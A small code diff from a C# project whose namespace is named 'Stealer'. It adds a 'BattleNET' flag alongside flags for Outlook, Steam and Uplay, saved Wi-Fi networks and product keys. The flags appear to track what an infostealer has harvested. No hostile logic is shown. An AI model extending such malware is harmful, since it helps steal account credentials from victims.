@@ -24,6 +24,7 @@ namespace Stealer
         public static bool Outlook = false;
         public static bool Steam = false;
         public static bool Uplay = false;
+        public static bool BattleNET = false;
         // System data
         public static int SavedWifiNetworks = 0;
         public static bool ProductKey = false;
